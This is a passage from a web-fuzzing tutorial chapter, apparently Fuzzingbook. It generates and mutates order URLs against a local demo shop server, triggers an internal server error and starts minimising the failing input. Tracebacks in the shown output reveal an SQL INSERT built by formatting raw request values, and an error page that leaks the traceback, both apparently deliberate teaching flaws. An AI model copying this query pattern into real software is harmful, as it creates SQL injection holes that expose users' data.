<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Thank you for your Fuzzingbook Order!</strong>
  <p id="confirmation">
  We will send <strong>One FuzzingBook T-Shirt</strong> to Jane Doe in Seattle, 98104<br>
  A confirmation mail will be sent to doe@example.com.
  </p>
  <p>
  Want more swag?  Use our <a href="/">order form</a>!
  </p>
</div>
</body></html>
</div></div>
</div>
<p>And the order is in the database, too:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM orders&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">())</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[(&#39;tshirt&#39;, &#39;Jane Doe&#39;, &#39;doe@example.com&#39;, &#39;Seattle&#39;, &#39;98104&#39;)]
</pre></div>
</div>
</div>
</div>
</section>
<section id="error-messages">
<h4>Error Messages<a class="headerlink" href="#error-messages" title="Link to this heading">#</a></h4>
<p>We can also test whether the server correctly responds to invalid requests.  Nonexistent pages, for instance, are correctly handled:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">webbrowser</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="s2">&quot;/some/other/path&quot;</span><span class="p">)))</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:14] "GET /some/other/path HTTP/1.1" 404 -
</pre></div><div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Sorry.</strong>
  <p>
  This page does not exist.  Try our <a href="/">order form</a> instead.
  </p>
</div>
</body></html>
  </div></div>
</div>
<p>You may remember we also have a page for internal server errors.  Can we get the server to produce this page?  To find this out, we have to test the server thoroughly – which we do in the remainder of this chapter.</p>
</section>
</section>
</section>
<section id="fuzzing-input-forms">
<h2>Fuzzing Input Forms<a class="headerlink" href="#fuzzing-input-forms" title="Link to this heading">#</a></h2>
<p>After setting up and starting the server, let us now go and systematically test it – first with expected, and then with less expected values.</p>
<section id="fuzzing-with-expected-values">
<h3>Fuzzing with Expected Values<a class="headerlink" href="#fuzzing-with-expected-values" title="Link to this heading">#</a></h3>
<p>Since placing orders is all done by creating appropriate URLs, we define a <a class="reference internal" href="Grammars.html"><span class="std std-doc">grammar</span></a> <code class="docutils literal notranslate"><span class="pre">ORDER_GRAMMAR</span></code> which encodes ordering URLs.  It comes with a few sample values for names, email addresses, cities and (random) digits.</p>
<section id="excursion-implementing-cgi-decode">
<h4>Excursion: Implementing cgi_decode()<a class="headerlink" href="#excursion-implementing-cgi-decode" title="Link to this heading">#</a></h4>
<p>To make it easier to define strings that become part of a URL, we define the function <code class="docutils literal notranslate"><span class="pre">cgi_encode()</span></code>, taking a string and automatically encoding it into CGI:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span><span class="w"> </span><span class="nn">string</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">def</span><span class="w"> </span><span class="nf">cgi_encode</span><span class="p">(</span><span class="n">s</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">do_not_encode</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="ow">or</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
                <span class="ow">or</span> <span class="n">c</span> <span class="ow">in</span> <span class="s2">&quot;$-_.+!*&#39;(),&quot;</span> <span class="ow">or</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">do_not_encode</span><span class="p">):</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="n">c</span>
        <span class="k">elif</span> <span class="n">c</span> <span class="o">==</span> <span class="s1">&#39; &#39;</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="s1">&#39;+&#39;</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="si">%%%02x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">ret</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">s</span> <span class="o">=</span> <span class="n">cgi_encode</span><span class="p">(</span><span class="s1">&#39;Is &quot;DOW30&quot; down .24%?&#39;</span><span class="p">)</span>
<span class="n">s</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;Is+%22DOW30%22+down+.24%25%3f&#39;
</pre></div>
</div>
</div>
</div>
<p>The optional parameter <code class="docutils literal notranslate"><span class="pre">do_not_encode</span></code> allows us to skip certain characters from encoding.  This is useful when encoding grammar rules:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">cgi_encode</span><span class="p">(</span><span class="s2">&quot;&lt;string&gt;@&lt;string&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&lt;&gt;&quot;</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;&lt;string&gt;%40&lt;string&gt;&#39;
</pre></div>
</div>
</div>
</div>
<p><code class="docutils literal notranslate"><span class="pre">cgi_encode()</span></code> is the exact counterpart of the <code class="docutils literal notranslate"><span class="pre">cgi_decode()</span></code> function defined in the <a class="reference internal" href="Coverage.html"><span class="std std-doc">chapter on coverage</span></a>:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">Coverage</span><span class="w"> </span><span class="kn">import</span> <span class="n">cgi_decode</span>  <span class="c1"># minor dependency</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">cgi_decode</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;Is &quot;DOW30&quot; down .24%?&#39;
</pre></div>
</div>
</div>
</div>
</section>
<section id="id1">
<h4>End of Excursion<a class="headerlink" href="#id1" title="Link to this heading">#</a></h4>
<p>In the grammar, we make use of <code class="docutils literal notranslate"><span class="pre">cgi_encode()</span></code> to encode strings:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">Grammars</span><span class="w"> </span><span class="kn">import</span> <span class="n">crange</span><span class="p">,</span> <span class="n">is_valid_grammar</span><span class="p">,</span> <span class="n">syntax_diagram</span><span class="p">,</span> <span class="n">Grammar</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">ORDER_GRAMMAR</span><span class="p">:</span> <span class="n">Grammar</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s2">&quot;&lt;start&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;order&gt;&quot;</span><span class="p">],</span>
    <span class="s2">&quot;&lt;order&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;/order?item=&lt;item&gt;&amp;name=&lt;name&gt;&amp;email=&lt;email&gt;&amp;city=&lt;city&gt;&amp;zip=&lt;zip&gt;&quot;</span><span class="p">],</span>
    <span class="s2">&quot;&lt;item&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;tshirt&quot;</span><span class="p">,</span> <span class="s2">&quot;drill&quot;</span><span class="p">,</span> <span class="s2">&quot;lockset&quot;</span><span class="p">],</span>
    <span class="s2">&quot;&lt;name&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="n">cgi_encode</span><span class="p">(</span><span class="s2">&quot;Jane Doe&quot;</span><span class="p">),</span> <span class="n">cgi_encode</span><span class="p">(</span><span class="s2">&quot;John Smith&quot;</span><span class="p">)],</span>
    <span class="s2">&quot;&lt;email&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="n">cgi_encode</span><span class="p">(</span><span class="s2">&quot;j.doe@example.com&quot;</span><span class="p">),</span> <span class="n">cgi_encode</span><span class="p">(</span><span class="s2">&quot;j_smith@example.com&quot;</span><span class="p">)],</span>
    <span class="s2">&quot;&lt;city&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;Seattle&quot;</span><span class="p">,</span> <span class="n">cgi_encode</span><span class="p">(</span><span class="s2">&quot;New York&quot;</span><span class="p">)],</span>
    <span class="s2">&quot;&lt;zip&gt;&quot;</span><span class="p">:</span> <span class="p">[</span><span class="s2">&quot;&lt;digit&gt;&quot;</span> <span class="o">*</span> <span class="mi">5</span><span class="p">],</span>
    <span class="s2">&quot;&lt;digit&gt;&quot;</span><span class="p">:</span> <span class="n">crange</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">,</span> <span class="s1">&#39;9&#39;</span><span class="p">)</span>
<span class="p">}</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">assert</span> <span class="n">is_valid_grammar</span><span class="p">(</span><span class="n">ORDER_GRAMMAR</span><span class="p">)</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">syntax_diagram</span><span class="p">(</span><span class="n">ORDER_GRAMMAR</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>start
</pre></div>
</div>
<img alt="_images/815edb2d5298053de13e1b91cf6ae971cfdeb16e16d77d4466c50c64ca2e7b0c.svg" src="_images/815edb2d5298053de13e1b91cf6ae971cfdeb16e16d77d4466c50c64ca2e7b0c.svg" />
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>order
</pre></div>
</div>
<img alt="_images/749bcd4db257a72a407dbb2dfd7159c135c933a9c54237578d851db673206ac3.svg" src="_images/749bcd4db257a72a407dbb2dfd7159c135c933a9c54237578d851db673206ac3.svg" />
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>item
</pre></div>
</div>
<img alt="_images/11efca7fce143e8210d863f72ad465b677107f0d208199215f06f0550136b26c.svg" src="_images/11efca7fce143e8210d863f72ad465b677107f0d208199215f06f0550136b26c.svg" />
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>name
</pre></div>
</div>
<img alt="_images/51ada8e6facadf1c22dc56161b126d4ad706df2c377639256c1d9a72bb955d5a.svg" src="_images/51ada8e6facadf1c22dc56161b126d4ad706df2c377639256c1d9a72bb955d5a.svg" />
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>email
</pre></div>
</div>
<img alt="_images/5accde0c188430163558d42668653daf2023e77483e0150add8a3655b772ab34.svg" src="_images/5accde0c188430163558d42668653daf2023e77483e0150add8a3655b772ab34.svg" />
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>city
</pre></div>
</div>
<img alt="_images/f9369a2d0ee06aac08fe28e3b9129ed70a38353fdf616c0397a650b4da24b585.svg" src="_images/f9369a2d0ee06aac08fe28e3b9129ed70a38353fdf616c0397a650b4da24b585.svg" />
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>zip
</pre></div>
</div>
<img alt="_images/b257359e837bdc88f2fdd173cf8a1cb476365ed85a5e42ab989beb8b7b27ea19.svg" src="_images/b257359e837bdc88f2fdd173cf8a1cb476365ed85a5e42ab989beb8b7b27ea19.svg" />
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>digit
</pre></div>
</div>
<img alt="_images/831527e2b2231b00574fb7a68ba1dce71a738444df89dc5f1c870b2354eef828.svg" src="_images/831527e2b2231b00574fb7a68ba1dce71a738444df89dc5f1c870b2354eef828.svg" />
</div>
</div>
<p>Using <a class="reference internal" href="#GrammarFuzzer.iynb"><span class="xref myst">one of our grammar fuzzers</span></a>, we can instantiate this grammar and generate URLs:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">GrammarFuzzer</span><span class="w"> </span><span class="kn">import</span> <span class="n">GrammarFuzzer</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">order_fuzzer</span> <span class="o">=</span> <span class="n">GrammarFuzzer</span><span class="p">(</span><span class="n">ORDER_GRAMMAR</span><span class="p">)</span>
<span class="p">[</span><span class="n">order_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)]</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;/order?item=drill&amp;name=Jane+Doe&amp;email=j.doe%40example.com&amp;city=New+York&amp;zip=42436&#39;,
 &#39;/order?item=drill&amp;name=John+Smith&amp;email=j_smith%40example.com&amp;city=New+York&amp;zip=56213&#39;,
 &#39;/order?item=drill&amp;name=Jane+Doe&amp;email=j_smith%40example.com&amp;city=Seattle&amp;zip=63628&#39;,
 &#39;/order?item=drill&amp;name=John+Smith&amp;email=j.doe%40example.com&amp;city=Seattle&amp;zip=59538&#39;,
 &#39;/order?item=drill&amp;name=Jane+Doe&amp;email=j_smith%40example.com&amp;city=New+York&amp;zip=41160&#39;]
</pre></div>
</div>
</div>
</div>
<p>Sending these URLs to the server will have them processed correctly:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">HTML</span><span class="p">(</span><span class="n">webbrowser</span><span class="p">(</span><span class="n">urljoin</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="n">order_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">())))</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:15] INSERT INTO orders VALUES ('lockset', 'Jane Doe', 'j_smith@example.com', 'Seattle', '16631')
</pre></div><div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:15] "GET /order?item=lockset&name=Jane+Doe&email=j_smith%40example.com&city=Seattle&zip=16631 HTTP/1.1" 200 -
</pre></div><div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Thank you for your Fuzzingbook Order!</strong>
  <p id="confirmation">
  We will send <strong>One FuzzingBook Lock Set</strong> to Jane Doe in Seattle, 16631<br>
  A confirmation mail will be sent to j_smith@example.com.
  </p>
  <p>
  Want more swag?  Use our <a href="/">order form</a>!
  </p>
</div>
</body></html>
</div></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">print</span><span class="p">(</span><span class="n">db</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&quot;SELECT * FROM orders&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">fetchall</span><span class="p">())</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[(&#39;tshirt&#39;, &#39;Jane Doe&#39;, &#39;doe@example.com&#39;, &#39;Seattle&#39;, &#39;98104&#39;), (&#39;lockset&#39;, &#39;Jane Doe&#39;, &#39;j_smith@example.com&#39;, &#39;Seattle&#39;, &#39;16631&#39;)]
</pre></div>
</div>
</div>
</div>
</section>
</section>
<section id="fuzzing-with-unexpected-values">
<h3>Fuzzing with Unexpected Values<a class="headerlink" href="#fuzzing-with-unexpected-values" title="Link to this heading">#</a></h3>
<p>We can now see that the server does a good job when faced with “standard” values.  But what happens if we feed it non-standard values?  To this end, we make use of a <a class="reference internal" href="MutationFuzzer.html"><span class="std std-doc">mutation fuzzer</span></a> which inserts random changes into the URL.  Our seed (i.e. the value to be mutated) comes from the grammar fuzzer:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">seed</span> <span class="o">=</span> <span class="n">order_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span>
<span class="n">seed</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;/order?item=drill&amp;name=Jane+Doe&amp;email=j.doe%40example.com&amp;city=Seattle&amp;zip=45732&#39;
</pre></div>
</div>
</div>
</div>
<p>Mutating this string yields mutations not only in the field values, but also in field names as well as the URL structure.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">MutationFuzzer</span><span class="w"> </span><span class="kn">import</span> <span class="n">MutationFuzzer</span>  <span class="c1"># minor deoendency</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mutate_order_fuzzer</span> <span class="o">=</span> <span class="n">MutationFuzzer</span><span class="p">([</span><span class="n">seed</span><span class="p">],</span> <span class="n">min_mutations</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">max_mutations</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span>
<span class="p">[</span><span class="n">mutate_order_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)]</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[&#39;/order?item=drill&amp;name=Jane+Doe&amp;email=j.doe%40example.com&amp;city=Seattle&amp;zip=45732&#39;,
 &#39;/order?item=drill&amp;name=Jane+Doe&amp;email=.doe%40example.com&amp;city=Seattle&amp;zip=45732&#39;,
 &#39;/order?item=drill;&amp;name=Jane+Doe&amp;email=j.doe%40example.com&amp;city=Seattle&amp;zip=45732&#39;,
 &#39;/order?item=drill&amp;name=Jane+Doe&amp;emil=j.doe%40example.com&amp;city=Seattle&amp;zip=45732&#39;,
 &#39;/order?item=drill&amp;name=Jane+Doe&amp;email=j.doe%40example.com&amp;city=Seattle&amp;zip=4732&#39;]
</pre></div>
</div>
</div>
</div>
<p>Let us fuzz a little until we get an internal server error.  We use the Python <code class="docutils literal notranslate"><span class="pre">requests</span></code> module to interact with the Web server such that we can directly access the HTTP status code.</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
    <span class="n">path</span> <span class="o">=</span> <span class="n">mutate_order_fuzzer</span><span class="o">.</span><span class="n">fuzz</span><span class="p">()</span>
    <span class="n">url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="n">HTTPStatus</span><span class="o">.</span><span class="n">INTERNAL_SERVER_ERROR</span><span class="p">:</span>
        <span class="k">break</span>
</pre></div>
</div>
</div>
</div>
<p>That didn’t take long.  Here’s the offending URL:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">url</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;http://127.0.0.1:8800/order?item=drill&amp;nae=Jane+Doe&amp;email=j.doe%40example.com&amp;city=Seattle&amp;zip=45732&#39;
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">clear_httpd_messages</span><span class="p">()</span>
<span class="n">HTML</span><span class="p">(</span><span class="n">webbrowser</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:15] "GET /order?item=drill&nae=Jane+Doe&email=j.doe%40example.com&city=Seattle&zip=45732 HTTP/1.1" 500 -
</pre></div><div class="output text_html"><pre style="background: NavajoWhite;">127.0.0.1 - - [26/Oct/2025 14:35:15] Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/3183845167.py", line 8, in do_GET
    self.handle_order()
    ~~~~~~~~~~~~~~~~~^^
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/1342827050.py", line 4, in handle_order
    self.store_order(values)
    ~~~~~~~~~~~~~~~~^^^^^^^^
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
KeyError: 'name'
</pre></div><div class="output text_html">
<html><body>
<div style="border:3px; border-style:solid; border-color:#FF0000; padding: 1em;">
  <strong id="title" style="font-size: x-large">Internal Server Error</strong>
  <p>
  The server has encountered an internal error.  Go to our <a href="/">order form</a>.
  <pre>Traceback (most recent call last):
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/3183845167.py", line 8, in do_GET
    self.handle_order()
    ~~~~~~~~~~~~~~~~~^^
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/1342827050.py", line 4, in handle_order
    self.store_order(values)
    ~~~~~~~~~~~~~~~~^^^^^^^^
  File "/var/folders/n2/xd9445p97rb3xh7m1dfx8_4h0006ts/T/ipykernel_25801/1382513861.py", line 5, in store_order
    sql_command = "INSERT INTO orders VALUES ('{item}', '{name}', '{email}', '{city}', '{zip}')".format(**values)
KeyError: 'name'
</pre>
  </p>
</div>
</body></html>
  </div></div>
</div>
<p>How does the URL cause this internal error?  We make use of <a class="reference internal" href="Reducer.html"><span class="std std-doc">delta debugging</span></a> to minimize the failure-inducing path, setting up a <code class="docutils literal notranslate"><span class="pre">WebRunner</span></code> class to define the failure condition:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">failing_path</span> <span class="o">=</span> <span class="n">path</span>
<span class="n">failing_path</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>&#39;/order?item=drill&amp;nae=Jane+Doe&amp;email=j.doe%40example.com&amp;city=Seattle&amp;zip=45732&#39;
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">Fuzzer</span><span class="w"> </span><span class="kn">import</span> <span class="n">Runner</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">class</span><span class="w"> </span><span class="nc">WebRunner</span><span class="p">(</span><span class="n">Runner</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Runner for a Web server&quot;&quot;&quot;</span>

    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">base_url</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">base_url</span> <span class="o">=</span> <span class="n">base_url</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">run</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Tuple</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="nb">str</span><span class="p">]:</span>
        <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">base_url</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
            <span class="n">url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>

        <span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>  <span class="c1"># for imports</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="n">HTTPStatus</span><span class="o">.</span><span class="n">OK</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">url</span><span class="p">,</span> <span class="n">Runner</span><span class="o">.</span><span class="n">PASS</span>
        <span class="k">elif</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="n">HTTPStatus</span><span class="o">.</span><span class="n">INTERNAL_SERVER_ERROR</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">url</span><span class="p">,</span> <span class="n">Runner</span><span class="o">.</span><span class="n">FAIL</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">url</span><span class="p">,</span> <span class="n">Runner</span><span class="o">.</span><span class="n">UNRESOLVED</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">web_runner</span> <span class="o">=</span> <span class="n">WebRunner</span><span class="p">(</span><span class="n">httpd_url</span><span class="p">)</span>
<span class="n">web_runner</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">failing_path</span><span class="p">)</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>(&#39;http://127.0.0.1:8800/order?item=drill&amp;nae=Jane+Doe&amp;email=j.doe%40example.com&amp;city=Seattle&amp;zip=45732&#39;,
 &#39;FAIL&#39;)
</pre></div>
</div>
</div>
</div>
<p>This is the minimized path:</p>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span><span class="w"> </span><span class="nn">Reducer</span><span class="w"> </span><span class="kn">import</span> <span class="n">DeltaDebuggingReducer</span>  <span class="c1"># minor</span>
</pre></div>
</div>
</div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">minimized_path</span> <span class="o">=</span> <span class="n">DeltaDebuggingReducer</span><span class="p">(</span><span class="n">web_runner</span><span class="p">)</span><span class="o">.</span><span class="n">reduce</span><span class="p">(</span><span class="n">failing_path</span><span class="p">)</span>
<span class="n">minimized_path</span>
</pre></div>
</div>
</div>
<div class="cell_output docutils container">
